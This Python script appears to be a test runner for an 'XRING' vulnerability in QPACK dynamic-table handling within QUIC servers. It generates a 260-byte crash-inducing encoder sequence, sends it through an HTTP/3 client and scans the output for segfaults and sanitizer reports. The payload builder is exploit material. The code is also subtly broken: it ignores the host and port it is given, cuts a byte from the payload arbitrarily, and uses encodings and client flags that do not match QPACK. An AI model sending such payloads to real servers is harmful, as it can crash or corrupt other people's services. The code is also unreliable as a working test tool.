#!/usr/bin/env python3
"""
QUIC QPACK XRING Test Runner
Automated testing for XRING vulnerabilities in QUIC implementations
"""

import subprocess
import sys
import os
import json
import tempfile
import hashlib
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Optional, List, Dict

@dataclass
class TestResult:
    timestamp: str
    implementation: str
    status: str
    crash_detected: bool
    signal: Optional[str]
    memory_violation: bool
    response_time_ms: Optional[int]
    error_message: Optional[str]
    logs: List[str]
    payload_size: int

    def to_dict(self):
        return asdict(self)

    def save(self, filename: str):
        with open(filename, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)

class XRingTestRunner:
    def __init__(self, implementation: str):
        self.impl = implementation
        self.payload = self.generate_xring_payload()
        self.results: List[TestResult] = []

    def generate_xring_payload(self) -> bytes:
        """
        Generate 260-byte XRING attack sequence
        Based on the confirmed XQUIC vulnerability PoC
        """
        payload = bytearray()

        # Step 1: SET_DYNAMIC_TABLE_CAPACITY = 64
        payload.extend([0x20, 0x40])  # 2 bytes

        # Step 2: 61 small INSERT operations (4 bytes each)
        for _ in range(61):
            payload.extend([0x40, 1, ord('x'), 0])  # 4 bytes each

        # Step 3: One larger INSERT operation (13 bytes)
        payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])

        # Step 4: SET_DYNAMIC_TABLE_CAPACITY = 65
        payload.extend([0x20, 0x41])  # 2 bytes

        # Total: 2 + 244 + 13 + 2 = 261 bytes
        # Trim to 260 bytes
        if len(payload) > 260:
            payload = payload[:-1]

        return bytes(payload)

    def encode_varint(self, value: int) -> bytes:
        """Encode variable-length integer for QPACK"""
        if value < 64:
            return bytes([value])
        elif value < 16384:
            return bytes([(value >> 6) | 0x40, value & 0x3F])
        else:
            return bytes([(value >> 14) | 0x80, (value >> 6) & 0x3F, value & 0x3F])

    def insert_operation(self, name: bytes, value: bytes) -> bytes:
        """Encode INSERT operation with name and value"""
        op = [0x40]
        name_len = len(name)
        if name_len < 64:
            op.append(name_len)
        else:
            op.append(0xF0 | (name_len & 0x0F))
            op.append(name_len >> 4)
        op.extend(name)
        value_len = len(value)
        if value_len < 64:
            op.extend([value_len])
        else:
            op.extend([0x3F, value_len - 64])
        op.extend(value)
        return bytes(op)

    def send_payload(self, host: str, port: int) -> Dict:
        """Send payload to server using HTTP/3"""
        try:
            process = subprocess.run(
                ['nghttp3-client', '-v', '--hpke-seed', 'dummy',
                 'http://localhost:443'],
                input=self.payload,
                capture_output=True,
                timeout=10,
                text=True
            )
            return {
                'returncode': process.returncode,
                'stdout': process.stdout,
                'stderr': process.stderr
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Timeout', 'returncode': -1, 'stdout': '', 'stderr': ''}
        except FileNotFoundError:
            return {'error': 'nghttp3-client not found', 'returncode': -1, 'stdout': '', 'stderr': ''}
        except Exception as e:
            return {'error': str(e), 'returncode': -1, 'stdout': '', 'stderr': ''}

    def analyze_results(self, response: Dict, start_time: float) -> Optional[TestResult]:
        """Analyze test response for crash indicators"""
        logs = response['stdout'] + response['stderr']
        response_time = int((datetime.now().timestamp() - start_time) * 1000)

        # Check for crash signals
        crash_indicators = ['SIGSEGV', 'SIGABRT', 'SIGTRAP', 'SIGBUS', 'segfault', 'abort']
        for indicator in crash_indicators:
            if indicator in logs.lower():
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    implementation=self.impl,
                    status='crashed',
                    crash_detected=True,
                    signal=indicator,
                    memory_violation=False,
                    response_time_ms=response_time,
                    error_message=f"Crash detected: {indicator}",
                    logs=[logs],
                    payload_size=len(self.payload)
                )

        # Check for memory safety violations
        memory_indicators = ['FORTIFY', 'ASAN', 'UBSAN', 'buffer overflow', 'memory corruption', 'heap-buffer-overflow']
        for indicator in memory_indicators:
            if indicator.lower() in logs.lower():
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    implementation=self.impl,
                    status='memory_violation',
                    crash_detected=True,
                    signal='MEMORY_VIOLATION',
                    memory_violation=True,
                    response_time_ms=response_time,
                    error_message=f"Memory violation: {indicator}",
                    logs=[logs],
                    payload_size=len(self.payload)
                )

        # Check for normal operation
        if '200' in logs or 'OK' in logs or 'status 200' in logs.lower():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                implementation=self.impl,
                status='running',
                crash_detected=False,
                signal=None,
                memory_violation=False,
                response_time_ms=response_time,
                error_message=None,
                logs=[logs],
                payload_size=len(self.payload)
            )

        # Error state
        return TestResult(
            timestamp=datetime.now().isoformat(),
            implementation=self.impl,
            status='error',
            crash_detected=False,
            signal=None,
            memory_violation=False,
            response_time_ms=response_time,
            error_message=response.get('error', 'Unknown error'),
            logs=[logs],
            payload_size=len(self.payload)
        )

    def run_test(self, host: str = 'localhost', port: int = 443) -> TestResult:
        """Execute the full test sequence"""
        print(f"Running XRING test against {self.impl}")

        start_time = datetime.now().timestamp()
        response = self.send_payload(host, port)
        result = self.analyze_results(response, start_time)

        if result:
            self.results.append(result)
            result.save(f"test_results_{self.impl}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")

            print(f"Result: {result.status.upper()}")
            if result.crash_detected:
                print(f"  Signal: {result.signal}")
            print(f"  Response time: {result.response_time_ms}ms")

        return result

    def generate_summary(self) -> str:
        """Generate summary of all test results"""
        if not self.results:
            return "No tests run yet."

        summary = f"XRING Test Summary for {self.impl}\n"
        summary += "=" * 50 + "\n\n"
        status_counts = {}
        for result in self.results:
            status = result.status
            status_counts[status] = status_counts.get(status, 0) + 1

        for status, count in status_counts.items():
            summary += f"{status.upper()}: {count}\n"

        summary += f"\nTotal tests: {len(self.results)}\n"
        summary += f"Last run: {self.results[-1].timestamp}\n"

        if any(r.crash_detected for r in self.results):
            summary += "\n⚠️  CRASHES DETECTED! \n"
            for result in self.results:
                if result.crash_detected:
                    summary += f"  - {result.timestamp}: {result.signal}\n"

        return summary

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='QUIC QPACK XRING Test Runner')
    parser.add_argument('--impl', required=True, help='QUIC implementation to test')
    parser.add_argument('--host', default='localhost', help='Server host')
    parser.add_argument('--port', default=443, type=int, help='Server port')

    args = parser.parse_args()

    runner = XRingTestRunner(args.impl)
    result = runner.run_test(args.host, args.port)

    print("\n" + runner.generate_summary())

    with open(f"xring_test_results_{args.impl}.json", 'w') as f:
        json.dump([r.to_dict() for r in runner.results], f, indent=2)
